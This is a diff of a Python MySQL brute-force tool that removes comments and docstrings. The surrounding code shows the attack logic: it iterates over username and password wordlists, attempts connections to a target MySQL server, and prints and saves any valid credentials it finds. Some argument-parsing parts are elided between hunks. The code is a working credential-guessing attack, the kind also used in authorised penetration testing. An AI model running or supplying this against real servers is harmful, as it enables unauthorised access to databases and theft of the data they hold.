@@ -4,21 +4,19 @@ import MySQLdb
 from colorama import init, Fore
 import socket
 
-# Initialize colorama for colored output
 init()
 GREEN = Fore.GREEN
 RED = Fore.RED
 RESET = Fore.RESET
 
 def connect(host, user, password, port, timeout):
-    """Attempt to connect to the MySQL server with provided credentials."""
     try:
         MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=timeout)
         result = f"{GREEN}[+] Found valid credentials:\n\tHOSTNAME: {host}\n\tUSERNAME: {user}\n\tPASSWORD: {password}{RESET}"
         print(result)
         return result
     except MySQLdb.OperationalError as e:
-        if e.args[0] == 2005:  # Error code for "Unknown server host"
+        if e.args[0] == 2005:
             print(f"{RED}[!] Invalid hostname or IP address: {host}. Stopping the brute force process.{RESET}")
             return "invalid_host"
         else:
@@ -31,7 +29,6 @@ def connect(host, user, password, port, timeout):
     return None
 
 def brute_force_mysql(host, port, usernames, passwords, timeout, output_file):
-    """Perform a brute force attack on the MySQL server."""
     try:
         for user in usernames:
             print(f"\n{GREEN}[!] Testing username: '{user}'{RESET}")
@@ -41,8 +38,8 @@ def brute_force_mysql(host, port, usernames, passwords, timeout, output_file):
                 result = connect(host, user, password, port, timeout)
                 if result == "invalid_host":
                     print(f"{RED}[!] Stopping brute force due to invalid hostname or IP address.{RESET}")
-                    sys.exit(1)  # Exit immediately
-                elif result:  # Valid credentials found
+                    sys.exit(1) 
+                elif result: 
                     found = True
                     if output_file:
                         with open(output_file, "a") as file:
@@ -71,7 +68,6 @@ def mysql_bruteforce_main(args=None):
     args = parser.parse_args(args)
     host, port, timeout, output_file = args.host, args.port, args.timeout, args.output
 
-    # Load usernames
     if args.usernames:
         usernames = list(read_file_in_chunks(args.usernames))
     elif args.user:
@@ -80,7 +76,6 @@ def mysql_bruteforce_main(args=None):
         print(f"{RED}[!] No usernames provided. Use -U for a list or -u for a single username.{RESET}")
         sys.exit(1)
 
-    # Load passwords
     if args.passwords:
         passwords = list(read_file_in_chunks(args.passwords))
     elif args.password:
@@ -92,7 +87,6 @@ def mysql_bruteforce_main(args=None):
     brute_force_mysql(host, port, usernames, passwords, timeout, output_file)
 
 def read_file_in_chunks(file_path):
-    """Read file line by line and strip whitespaces."""
     with open(file_path, "r") as file:
         for line in file:
             yield line.strip()
